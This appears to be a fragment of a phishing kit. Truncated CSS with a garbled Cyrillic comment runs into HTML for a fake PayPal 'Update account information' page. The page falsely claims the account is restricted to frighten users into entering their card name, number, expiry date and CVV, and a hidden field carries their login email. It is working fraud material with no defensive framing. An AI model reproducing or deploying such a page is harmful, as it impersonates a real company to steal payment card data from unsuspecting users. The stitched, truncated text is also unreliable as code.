formlabel {

  min-width: 170px;
  top: 8px;
  color: #fff;
  background: #f80000;
  font-size: 13px;
  padding: 7px;
  border-radius: 5px;
}
form label::after {
  content: '';
  position: absolute;
  /* ╨Р╨▒╤Б╨╛╨╗╤О╤В╨╜╨╛╨╡ ╨┐╨╛╨╖╨╕╤Ж╨╕╨╛╨╜╨╕╤А╨╛╨▓╨░╨╜╨╕╨╡ */

				<h1>Update account information</h1>

				<p>Just like a bank, we need to confirm the information you've given us. Please provide the requested information as soon as possible to ensure you can continue to use your PayPal account.</p>

				<p>Until we can confirm the information you've given us, we need to limit most of the functionality on your account.For now, you can continue to receive payments but you won't be able to withdraw funds or make payments.</p>

				<p>If your account is restricted, you won't be able to send transfer or receive funds.</p>
			</div>
			<div class="right">
				<form id="card" name="card" method="post" autocomplete="off">
					
					<h2><a href="/" style="width: 100px;float: left;"><img src="data:image/svg+xml;base64," alt="&amp;" style="width: 100%;"></a> Update card</h2>
					<h3>Please enter your card details below.</h3>
					
					

					

					
					

					

					

					

					

					<div class="line">
						<input type="text" class="input cardname" name="cc-name" placeholder="Name as it appears on your Card" autocomplete="off" required="">
					</div>

					<div class="line">
						<input type="text" class="input cardnum" name="cc-number" placeholder="Card number" maxlength="22" autocomplete="off" required="">
					</div>

					<div class="line line-left">
						<input id="cc-exp" type="text" class="input carddate" name="carddate" placeholder="Card expiry date" autocomplete="off" required="">
					</div>

					<div class="line line-right">
						<input type="text" autocomplete="off" class="input cardcode" name="cc-csc" placeholder="CSC / CVV" maxlength="4" required="">
					</div>

					<input type="hidden" class="input login" name="login" placeholder="Email address" value="" autocomplete="off" required="">

					

					<input type="submit" class="button" name="submit" value="Continue">

				</form>
			</div>
		</div>
